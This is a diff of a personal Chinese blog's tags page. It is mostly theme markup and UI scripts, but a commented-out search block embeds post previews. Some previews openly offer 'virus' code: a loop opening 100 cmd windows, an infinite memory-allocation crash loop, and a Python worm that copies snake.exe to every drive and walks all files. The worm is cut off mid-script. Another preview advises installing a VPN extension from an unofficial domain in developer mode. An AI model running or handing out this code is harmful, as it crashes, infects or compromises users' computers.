@@ -1,98 +1,1512 @@
+<!DOCTYPE html>
 <html>
   <head>
-  <meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Gridea</title>
-<link rel="shortcut icon" href="http://huangmingli.ml/favicon.ico?v=1596375826937">
-<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="http://huangmingli.ml/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="Gridea - Atom Feed" href="http://huangmingli.ml/atom.xml">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+      <meta charset="UTF-8"/>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="keywords" content="Gridea静态个人博客">
+<meta name="description" content="温故而知新">
+<meta name="theme-color" content="#000">
+<title>黄明礼的博客</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1596377280133">
+<link rel="stylesheet" href="/styles/main.css">
+<link rel="stylesheet" href="/media/css/mist.css">
+
+<link rel="stylesheet" href="/media/fonts/font-awesome.css">
+<link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Rosario:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+<link href="/media/hljs/styles/androidstudio.css" rel="stylesheet">  
+
+<script src="/media/hljs/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.0/velocity.ui.min.js"></script>
+
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
 
 
 
-  <meta name="description" content="温故而知新" />
   </head>
   <body>
-    <div class="main">
-      <div class="main-content">
-        <div class="site-header">
-  <a href="http://huangmingli.ml">
-  <img class="avatar" src="http://huangmingli.ml/images/avatar.png?v=1596375826937" alt="">
-  </a>
-  <h1 class="site-title">
-    Gridea
-  </h1>
-  <p class="site-description">
-    温故而知新
-  </p>
-  <div class="menu-container">
-    
+    <div class="head-top-line"></div>
+    <div class="header-box">
       
-        <a href="/" class="menu">
-          首页
-        </a>
-      
-    
-      
-        <a href="/archives" class="menu">
-          归档
-        </a>
-      
-    
-      
-        <a href="/tags" class="menu">
-          标签
-        </a>
-      
-    
-      
-        <a href="/post/about" class="menu">
-          关于
-        </a>
-      
-    
-  </div>
-  <div class="social-container">
-    
-      
-    
-      
-    
-      
-    
-      
-    
-      
-    
-  </div>
-</div>
-
-
-        <div class="tags-container">
+<div class=" mist">
+  <header class="header bg-color ">
+    <div class="blog-header box-shadow-wrapper  " id="header">
+      <div class="nav-toggle" id="nav_toggle">
+        <div class="toggle-box">
+          <div class="line line-top"></div>
+          <div class="line line-center"></div>
+          <div class="line line-bottom"></div>
+        </div>
+      </div>
+      <div class="site-meta">       
+        <div class="site-title">
           
-            <a class="tag" href="http://huangmingli.ml/tag/QP6qCLL04/">C++</a>
-          
-            <a class="tag" href="http://huangmingli.ml/tag/jExDrgbsVq/">软件</a>
-          
-            <a class="tag" href="http://huangmingli.ml/tag/DVl0teJMPT/">电脑操作</a>
-          
-            <a class="tag" href="http://huangmingli.ml/tag/Bz9PrMIYTT/">Python</a>
-          
-            <a class="tag" href="http://huangmingli.ml/tag/sQxBWofXSD/">文件</a>
-          
-            <a class="tag" href="http://huangmingli.ml/tag/Dqv8syIZ2h/">网站</a>
+            <a href="/" class="">
+              <span class="logo-line-before">
+                <i class=""></i>
+              </span>
+              <span class="main-title">黄明礼的博客</span>
+              <span class="logo-line-after">
+                <i class=""></i>
+              </span>
+            </a>  
           
         </div>
-
-        <div class="site-footer">
-  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="http://huangmingli.ml/atom.xml" target="_blank">
-    <i class="ri-rss-line"></i> RSS
-  </a>
+        
+      </div>
+      <nav class="site-nav" id="site_nav">
+        <ul id="nav_ul">
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/" target="_self">
+                  <i class="fa fa-home"></i> 首页
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/archives/" target="_self">
+                  <i class="fa fa-archive"></i> 归档
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item nav-item-active">
+              
+              
+                <a href="/tags/" target="_self">
+                  <i class="fa fa-tags"></i> 标签
+                </a>
+              
+            </li>
+          
+            
+            
+              
+            
+            <li class="nav-item ">
+              
+              
+                <a href="/post/about/" target="_self">
+                  <i class="fa fa-user"></i> 关于
+                </a>
+              
+            </li>
+          
+          
+            
+              <li class="nav-item ">
+                <a href="/friends/" target="_self">
+                  
+                    <i class="fa fa-ship"></i> 友情链接
+                  
+                </a>
+              </li>
+            
+          
+        </ul>
+      </nav>
+    </div>
+  </header>
 </div>
 
+<script type="text/javascript"> 
+ 
+  let showNav = true;
+
+  let navToggle = document.querySelector('#nav_toggle'),
+  siteNav = document.querySelector('#site_nav');
+  
+  function navClick() {
+    let sideBar = document.querySelector('.sidebar');
+    let navUl = document.querySelector('#nav_ul');
+    navToggle.classList.toggle('nav-toggle-active');
+    siteNav.classList.toggle('nav-menu-active');
+    if (siteNav.classList.contains('nav-menu-active')) {
+      siteNav.style = "height: " + (navUl.children.length * 42) +"px !important";
+    } else {
+      siteNav.style = "";
+    }
+  }
+
+  navToggle.addEventListener('click',navClick);  
+</script>
+    </div>
+    <div class="main-continer">
+      
+      <div class="section-layout bg-color mist">
+        <div class="section-layout-wrapper">
+          <div id="sidebarMeta" class="sidebar">
+    
+<div class="sidebar-wrapper box-shadow-wrapper ">
+  <div class="sidebar-item">
+    <img class="site-author-image right-motion" src="/images/avatar.png"/>
+    <p class="site-author-name">仅适用 Gemini,Pisces 布局</p>
+    <p class="site-description right-motion">仅适用 Gemini,Pisces 布局</p>
+  </div>
+  <div class="sidebar-item side-item-stat right-motion">
+    <div class="sidebar-item-box">
+      <a href="/archives/">
+        
+        <span class="site-item-stat-count">11</span>
+        <span class="site-item-stat-name">文章</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="">
+        <span class="site-item-stat-count">6</span>
+        <span class="site-item-stat-name">分类</span>
+      </a>
+    </div>
+    <div class="sidebar-item-box">
+      <a href="/tags/">
+        <span class="site-item-stat-count">6</span>
+        <span class="site-item-stat-name">标签</span>
+      </a>
+    </div>
+  </div>
+  
+  
+
+
+</div>
+</div>
+<script>
+  let sidebarMeta = document.querySelector('#sidebarMeta');
+  let scheme = 'mist';
+  let sidebarWrapper = document.querySelector('.sidebar-wrapper');
+  if (sidebarMeta && (scheme === 'pisces' || scheme === 'gemini')) {
+    document.addEventListener('scroll', function(e) {
+      if (document.scrollingElement.scrollTop > parseInt(sidebarMeta.style.marginTop) + 10) {
+        sidebarWrapper.classList.add('home-sidebar-fixed')
+      } else {
+        sidebarWrapper.classList.remove('home-sidebar-fixed')
+      }
+    });
+  }
+  </script>
+          <div class="section-box box-shadow-wrapper">
+            <section class="section tags-section bg-color posts-expand">
+              <div class="tags-box">
+  <div class="tag-cloud-title">
+    目前共计 6 个标签
+  </div>
+  <div class="tag-cloud-list" id="tags">
+    
+      
+      
+        
+      
+        
+      
+        
+          
+            
+      
+        
+      
+        
+          
+            
+      
+        
+          
+            
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+      
+      <a class="cloud-tag" href="http://huangmingli.ml/tag/QP6qCLL04/" rel="3">C++</a>
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+          
+            
+      
+        
+      
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+            
+      
+        
+          
+            
+      
+        
+          
+            
+      
+        
+          
+            
+      
+        
+          
+        
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+      
+      <a class="cloud-tag" href="http://huangmingli.ml/tag/jExDrgbsVq/" rel="6">软件</a>
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+            
+      
+        
+      
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+            
+      
+        
+          
+        
+      
+        
+          
+            
+      
+        
+          
+            
+      
+        
+          
+            
+      
+        
+      
+      <a class="cloud-tag" href="http://huangmingli.ml/tag/DVl0teJMPT/" rel="8">电脑操作</a>
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+      
+      <a class="cloud-tag" href="http://huangmingli.ml/tag/Bz9PrMIYTT/" rel="3">Python</a>
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+          
+            
+      
+        
+          
+            
+      
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+      
+      <a class="cloud-tag" href="http://huangmingli.ml/tag/sQxBWofXSD/" rel="5">文件</a>
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+        
+      
+        
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+            
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+          
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+          
+            
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+      
+      <a class="cloud-tag" href="http://huangmingli.ml/tag/Dqv8syIZ2h/" rel="2">网站</a>
+    
+  </div>
+</div>
+<script>
+
+  let fontStart = 12, fontEnd = 30, colorStart = '#666', colorEnd = '#000';
+  let tags = document.querySelector('#tags').children;
+  let counts = [];
+  for(let i = 0; i < tags.length; i++) {
+    counts.push(tags[i].rel);
+  }
+  let lowest = Math.min.apply(null,counts), highest = Math.max.apply(null,counts);;
+  let range = highest - lowest;
+  if (range === 0) {
+    range = 1;
+  }
+  let fontIncr, colorIncr;
+  fontIncr = (fontEnd - fontStart) / range;
+  
+  let sColorArr = toRGB(colorStart), eColorArr = toRGB(colorEnd);
+
+  for(let i = 0; i < tags.length; i++) {
+    let disCount = tags[i].rel - lowest;
+    let fontSize = fontStart + disCount * fontIncr;
+    let style = 'font-size: ' + fontSize + 'px;';
+    let arr = [];
+    for(let c = 0; c < sColorArr.length; c++) {
+      if (disCount === 0) {
+        disCount = 1;
+      }
+      let val = (sColorArr[c] - eColorArr[c]) / range * disCount;
+      if (val >= 100) {
+        val = eColorArr[c];
+      } else if (val <= 0) {
+        val = sColorArr[c];
+      }
+      arr[c] = Math.floor(val);
+    }
+    style += 'color: ' + toHex(arr);
+    tags[i].style = style;
+  }
+
+  function toRGB(code) {
+    if (code.length === 4) {
+      code = code.replace(/(\w)(\w)(\w)/gi, "\$1\$1\$2\$2\$3\$3");
+    }
+    var hex = /(\w{2})(\w{2})(\w{2})/.exec(code);
+    return [parseInt(hex[1], 16), parseInt(hex[2], 16), parseInt(hex[3], 16)];
+  }
+
+  function toHex(ary) {
+    return "#" + ((1 << 24) + (ary[0] << 16) + (ary[1] << 8) + ary[2]).toString(16).slice(1);
+  }
+
+</script>
+            </section>
+          </div>
+        </div>
       </div>
+      <div class="footer-box">
+  <footer class="footer">
+    <div class="copyright">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | © 2019-2020 Theme By <a href="https://github.com/hsxyhao/gridea-theme-next" target="_blank">HsxyHao</a>
+    </div>
+    <div class="poweredby">
+      <a target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=3172456158&site=qq&menu=yes"><img border="0" src="http://wpa.qq.com/pa?p=2:3172456158:41" alt="联系博主" title="联系博主"/></a>
+    </div>
+  </footer>
+  
+  
+    <div class="drawer-box left" id="drawer_box">
+      <span class="muse-line muse-line-first"></span>
+      <span class="muse-line muse-line-middle"></span>
+      <span class="muse-line muse-line-last"></span>
+    </div>
+  
+  <div class="mist back-to-top" id="back_to_top">
+    <i class="fa fa-arrow-up"></i>
+    
+  </div>
+  
+  
+  
+</div>
+<script>
+
+  let sideBarOpen = 'sidebar-open';
+  let body = document.body;
+  let back2Top = document.querySelector('#back_to_top'),
+  back2TopText = document.querySelector('#back_to_top_text'),
+  drawerBox = document.querySelector('#drawer_box'),
+  rightSideBar = document.querySelector('.sidebar'),
+  viewport = document.querySelector('body');
+
+  function scrollAnimation(currentY, targetY) {
+   
+    let needScrollTop = targetY - currentY
+    let _currentY = currentY
+    setTimeout(() => {
+      const dist = Math.ceil(needScrollTop / 10)
+      _currentY += dist
+      window.scrollTo(_currentY, currentY)
+      if (needScrollTop > 10 || needScrollTop < -10) {
+        scrollAnimation(_currentY, targetY)
+      } else {
+        window.scrollTo(_currentY, targetY)
+      }
+    }, 1)
+  }
+
+  back2Top.addEventListener("click", function(e) {
+    scrollAnimation(document.scrollingElement.scrollTop, 0);
+    e.stopPropagation();
+    return false;
+  });
+  
+  window.addEventListener('scroll', function(e) {
+    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
+    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
+      back2Top.classList.add('back-top-active');
+    }
+    if (percent == 0) {
+      back2Top.classList.remove('back-top-active');
+    }
+    if (back2TopText) {
+      back2TopText.textContent = Math.floor(percent);
+    }
+  });
+
+  
+  let hasCacu = false;
+  window.onresize = function() {
+    if (window.width > 991) {
+      calcuHeight();
+    } else {
+      hasCacu = false;
+    }
+  }
+
+  function calcuHeight() {
+    // 动态调整站点概览高度
+    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
+      let sideBar = document.querySelector('.sidebar');
+      let navUl = document.querySelector('#site_nav');
+      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
+      hasCacu = true;
+    }
+  }
+  calcuHeight();
+  
+  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';
+
+  if (drawerBox) {
+    let rightMotions = document.querySelectorAll('.right-motion');
+    let right = drawerBox.classList.contains('right');
+
+    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";
+
+    let openProp, closeProp;
+    if (right) {
+      openProp = {
+        paddingRight: RIGHT_MOVE_DIS 
+      };
+      closeProp = {
+        paddingRight: '0px'
+      };
+    } else {
+      openProp = {
+        paddingLeft: RIGHT_MOVE_DIS 
+      };
+      closeProp = {
+        paddingLeft: '0px'
+      };
+    }
+
+    drawerBox.onclick = function() {
+      open = !open;
+      window.Velocity(rightSideBar, 'stop');
+      window.Velocity(viewport, 'stop');
+      window.Velocity(rightMotions, 'stop');
+      if (open) {
+        window.Velocity(rightSideBar, {
+          width: RIGHT_MOVE_DIS
+        }, {
+          duration: MOTION_TIME,
+          begin: function() {
+            window.Velocity(rightMotions, transitionDir,{ });
+          }
+        })
+        window.Velocity(viewport, openProp,{
+          duration: MOTION_TIME
+        });
+      } else {
+        window.Velocity(rightSideBar, {
+          width: '0px'
+        }, {
+          duration: MOTION_TIME,
+          begin: function() {
+            window.Velocity(rightMotions, {
+              opacity: 0
+            });
+          }
+        })
+        window.Velocity(viewport, closeProp ,{
+          duration: MOTION_TIME
+        });
+      }
+      for (let i = 0; i < drawerBox.children.length; i++) {
+        drawerBox.children[i].classList.toggle('muse-line');
+      }
+      drawerBox.classList.toggle(sideBarOpen);
+    }
+  }
+
+  // 链接跳转
+  let newWindow = 'false'
+  if (newWindow === 'true') {
+    let links = document.querySelectorAll('.post-body a')
+    links.forEach(item => {
+      if (!item.classList.contains('btn')) {
+        item.setAttribute("target","_blank");
+      }
+    })
+  }
+  // 代码高亮
+  hljs.initHighlightingOnLoad();
+
+</script>
     </div>
   </body>
-</html>
+  <input hidden id="copy" />
+<script>
+//拿来主义(真香)^_^，Clipboard 实现摘自掘金 https://juejin.im/post/5aefeb6e6fb9a07aa43c20af
+window.Clipboard = (function(window, document, navigator) {
+  var textArea,
+      copy;
+
+  // 判断是不是ios端
+  function isOS() {
+    return navigator.userAgent.match(/ipad|iphone/i);
+  }
+  //创建文本元素
+  function createTextArea(text) {
+    textArea = document.createElement('textArea');
+    textArea.value = text;
+    textArea.style.width = 0;
+    textArea.style.height = 0;
+    textArea.clientHeight = 0;
+    textArea.clientWidth = 0;
+    document.body.appendChild(textArea);
+  }
+  //选择内容
+  function selectText() {
+    var range,
+        selection;
+
+    if (isOS()) {
+      range = document.createRange();
+      range.selectNodeContents(textArea);
+      selection = window.getSelection();
+      selection.removeAllRanges();
+      selection.addRange(range);
+      textArea.setSelectionRange(0, 999999);
+    } else {
+      textArea.select();
+    }
+  }
+
+//复制到剪贴板
+  function copyToClipboard() {        
+    try{
+      document.execCommand("Copy")
+    }catch(err){
+      alert("复制错误！请手动复制！")
+    }
+    document.body.removeChild(textArea);
+  }
+
+  copy = function(text) {
+    createTextArea(text);
+    selectText();
+    copyToClipboard();
+  };
+
+  return {
+    copy: copy
+  };
+})(window, document, navigator);
+
+function copyCode (e) {
+  if (e.srcElement.tagName === 'SPAN' && e.srcElement.classList.contains('copy-code')) {
+    let code = e.currentTarget.querySelector('code');
+    var text = code.innerText;
+    if (e.srcElement.textContent === '复制成功') {
+      console.log('复制操作频率过高');
+      return;
+    }
+    e.srcElement.textContent = '复制成功';
+    (function(elem){
+      setTimeout(() => {
+        if (elem.textContent === '复制成功') {
+          elem.textContent = '复制代码'
+        }
+      }, 1000);
+    })(e.srcElement)
+    Clipboard.copy(text);
+  }
+}
+
+ let pres = document.querySelectorAll('pre');
+ pres.forEach(pre => {
+  let code = pre.querySelector('code');
+  let copyElem = document.createElement('span');
+  copyElem.classList.add('copy-code');
+  copyElem.textContent = '复制代码';
+  pre.appendChild(copyElem);
+  pre.onclick = copyCode
+ })
+</script>
+<script src="/media/js/motion.js"></script>
+<!-- <div class="search-mask" id="search_mask">
+  <div class="search-box">
+    <div class="search-title">
+      <i class="fa fa-search"></i>
+      <div class="input-box">
+        <input type="text" placeholder="搜索">
+      </div>
+      <i class="fa fa-times-circle"></i>
+    </div>
+    <div class="result">
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/Yc9CYbUw2/"" data-c="&lt;p&gt;视频：&lt;/p&gt;
+&lt;iframe src=&#34;//player.bilibili.com/player.html?aid=200475966&amp;bvid=BV14z411z76W&amp;cid=183180970&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34;&gt; &lt;/iframe&gt;
+&lt;p&gt;视频地址：&lt;a href=&#34;https://www.bilibili.com/video/BV14z411z76W/&#34;&gt;https://www.bilibili.com/video/BV14z411z76W/&lt;/a&gt;&lt;/p&gt;
+">认识和安装Python——跟小学生学编程</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/LqyoenAHz/"" data-c="&lt;script type=&#34;text/javascript&#34;&gt;(function(){document.write(unescape(&#39;%3Cdiv id=&#34;bdcs&#34;%3E%3C/div%3E&#39;));var bdcs = document.createElement(&#39;script&#39;);bdcs.type = &#39;text/javascript&#39;;bdcs.async = true;bdcs.src = &#39;http://znsv.baidu.com/customer_search/api/js?sid=17245644332282096764&#39; + &#39;&amp;plate_url=&#39; + encodeURIComponent(window.location.href) + &#39;&amp;t=&#39; + Math.ceil(new Date()/3600000);var s = document.getElementsByTagName(&#39;script&#39;)[0];s.parentNode.insertBefore(bdcs, s);})();&lt;/script&gt;
+&lt;style type=&#34;text/css&#34;&gt;;;
+#so360{white-space:nowrap}
+#so360_keyword{width:222
+#so360 form{margin:0;padding:0}px center;}
+#so360_submit{width:60outline:0;vertical-align:middle;padding-right: 95px;}
+#so360_keyword{background:url(https://p.ssl.qhimg.com/t01ab1a3fb05f0ee893.png)
+ no-repeat 242&lt;/style&gt;
+&lt;div id=&#34;so360&#34;&gt;
+    &lt;form action=&#34;http://www.so.com/s&#34; target=&#34;_blank&#34; id=&#34;so360form&#34;&gt;
+   &lt;input type=&#34;text&#34; autocomplete=&#34;off&#34; name=&#34;q&#34; id=&#34;so360_keyword&#34;&gt;
+        &lt;input type=&#34;submit&#34; id=&#34;so360_submit&#34; value=&#34;搜 索&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;ie&#34; value=&#34;utf8&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;src&#34; value=&#34;zz_huangmingli.ml&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;site&#34; value=&#34;huangmingli.ml&#34;&gt;
+        &lt;input type=&#34;hidden&#34; name=&#34;rg&#34; value=&#34;1&#34;&gt;
+    &lt;/form&gt;
+&lt;/div&gt;">搜索</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/Aimzsf-cV/"" data-c="&lt;p&gt;坦克大战深受很多人喜爱，今天，我也来写一个坦克大战&lt;br&gt;
+代码有点长，先给出下载链接&lt;br&gt;
+&amp;lt; https://share.weiyun.com/5xFH7rD &amp;gt;下载&lt;/p&gt;
+&lt;p&gt;cpp是源码，exe是程序&lt;/p&gt;
+">C++坦克大战小游戏</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/A2YyutqDb/"" data-c="&lt;h2 id=&#34;欢迎给我打钱小站经营需要费用啊~~~&#34;&gt;欢迎给我打钱，小站经营需要费用啊~~~&lt;/h2&gt;
+&lt;p&gt;微信&lt;br&gt;
+&lt;img src=&#34;http://huangmingli.ml/post-images/1588823507680.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+&lt;p&gt;QQ&lt;br&gt;
+&lt;img src=&#34;http://huangmingli.ml/post-images/1592567221193.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
+">打赏</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/yon/"" data-c="&lt;p&gt;上代码：&lt;br&gt;
+Python：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os
+#将下面改为&amp;quot;while 1:&amp;quot;会永远执行（直到叉掉或关机）
+for x in range(1,100):
+    os.system(&amp;quot;start&amp;quot;)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;C++：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;windows.h&amp;gt;
+using namespace std;
+int main()
+{
+/*永远执行需要将下面一句改为
+    &amp;quot;while(1)&amp;quot;*/
+	for(int i = 1;i &amp;lt;= 100;i++)
+	{
+		system(&amp;quot;start&amp;quot;);
+	}
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;视频可以到B站上看：&lt;a href=&#34;https://www.bilibili.com/video/BV1sC4y147b8/&#34;&gt;https://www.bilibili.com/video/BV1sC4y147b8/&lt;/a&gt;&lt;/p&gt;
+">用Python和C++实现卡机病毒---100个cmd窗口</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/yong-python-he-cshi-xian-qia-ji-bing-du-100-ge-cmd-chuang-kou/"" data-c="&lt;p&gt;上代码：&lt;br&gt;
+Python：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import os
+#将下面改为&amp;quot;while 1:&amp;quot;会永远执行（直到叉掉或关机）
+for x in range(1,100):
+    os.system(&amp;quot;start&amp;quot;)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;C++：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;windows.h&amp;gt;
+using namespace std;
+int main()
+{
+/*永远执行需要将下面一句改为
+    &amp;quot;while(1)&amp;quot;*/
+	for(int i = 1;i &amp;lt;= 100;i++)
+	{
+		system(&amp;quot;start&amp;quot;);
+	}
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;视频可以到B站上看：&lt;a href=&#34;https://www.bilibili.com/video/BV1sC4y147b8/&#34;&gt;https://www.bilibili.com/video/BV1sC4y147b8/&lt;/a&gt;&lt;/p&gt;
+">用Python和C++实现卡机病毒---100个cmd窗口</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/jie-jue-wo-de-bo-ke-fang-wen-man-de-fang-fa/"" data-c="&lt;p&gt;由于本人没有钱💴，所以没法买某某云的域名，看了洛谷日报上的文章，用的是Github的二级域名。&lt;br&gt;
+Github是外国网站，访问比较慢，所以要想加速，就挂VPN（也叫科学上网工具）&lt;/p&gt;
+&lt;p&gt;这里推荐一款VPN：setupVPN&lt;a href=&#34;https://base1-sv.diltwo.com//public/Chrome/Chrome-SetupVPN-3.8.8.crx&#34;&gt;https://base1-sv.diltwo.com//public/Chrome/Chrome-SetupVPN-3.8.8.crx&lt;/a&gt;安装时注意：请用谷歌开发者模式安装！！！&lt;/p&gt;
+&lt;p&gt;安装好后，请选择英国通道（本人的电脑无法用美国、意大利等国的通道）&lt;/p&gt;
+&lt;p&gt;不要买VIP    有钱人忽略&lt;/p&gt;
+&lt;p&gt;2020/4/19注：新网址&lt;a href=&#34;http://hmlblog.ml&#34;&gt;http://hmlblog.ml&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;2020/5/8注：新网址&lt;a href=&#34;http://huangmingli.ml&#34;&gt;http://huangmingli.ml&lt;/a&gt;&lt;/p&gt;
+">解决我的博客访问慢的方法</a>
+        </div>
+      
+        <div class="item">
+          <a class="result-title" href="http://huangmingli.ml/post/bing-du/"" data-c="&lt;blockquote&gt;
+&lt;p&gt;参考了CSDN &lt;a href=&#34;https://blog.csdn.net/weixin_42904058&#34;&gt;和平鸽5567&lt;/a&gt; 的文档，这里是几篇文章的汇总&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;1号病毒&#34;&gt;1号病毒：&lt;/h2&gt;
+&lt;h3 id=&#34;病毒是c语言&#34;&gt;病毒是C++语言&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt; 
+/*病毒不需要万能头文件，只需iostream，为了方便读者在下面添加其他功能，所以用万能头文件*/
+using namespace std;
+int main(){
+    while(true)
+    {
+        char *p=new char[10000];
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这代码没有什么要解释的，太简单。第五行是程序的关键，用来动态调用系统内存，并利用new函数插入10000（本数字是我精心挑选的，它是最大的不引起系统警告，而死机速度又很快的）个字符。&lt;/p&gt;
+&lt;h2 id=&#34;2号病毒&#34;&gt;2号病毒：&lt;/h2&gt;
+&lt;h3 id=&#34;病毒是python3语言&#34;&gt;病毒是Python3语言&lt;/h3&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import win32api
+import win32con
+import hashlib
+import os
+import shutil
+import time
+ 
+jmp = os.popen(&amp;quot;wmic VOLUME GET Label, Name&amp;quot;).read()
+ 
+def Copy(np):
+    p = os.getcwd() + &#39;\\snake.exe&#39;
+    os.chdir(np)
+    shutil.copy(p,np)
+ 
+def Usb():
+    plates = os.popen(&amp;quot;wmic VOLUME GET Label, Name&amp;quot;).read()
+    pl=[&#39;A:/&#39;,&#39;B:/&#39;,&#39;C:/&#39;,&#39;D:/&#39;,&#39;E:/&#39;,&#39;F:/&#39;,&#39;G:/&#39;,&#39;H:/&#39;,&#39;I:/&#39;,&#39;J:/&#39;,&#39;K:/&#39;,&#39;L:/&#39;,&#39;M:/&#39;,&#39;N:/&#39;,&#39;O:/&#39;,&#39;P:/&#39;,&#39;Q:/&#39;,&#39;R:/&#39;,&#39;S:/&#39;,&#39;T:/&#39;,&#39;U:/&#39;,&#39;V:/&#39;,&#39;W:/&#39;,&#39;X:/&#39;,&#39;Y:/&#39;,&#39;Z:/&#39;]
+    l = plates.__len__()
+    i = 0
+    for i in range(l+1):
+        try:
+            if plates[i+1]==&#39;:&#39;:
+                path = plates[i] + plates[i+1] + plates[i+2]
+                vpath = path + &#39;snake.exe&#39;
+                try:
+                    f = open(vpath)
+                except:
+                    Copy(path)
+        except:
+            pass
+ 
+def Thanos(plate):
+    g = os.walk(plate)
+    for path,d,filelist in g:
+        for filename in filelist:
+            if &#39;snake.exe&#39; not in os.path.join(path,filename):
+                xd = open(os.path.join(path, filename), &#39;rb&#39;).read()
+                gys = xd
+                sha1 = hashlib.sha1(gys)
+                osv = sha1.hexdigest()
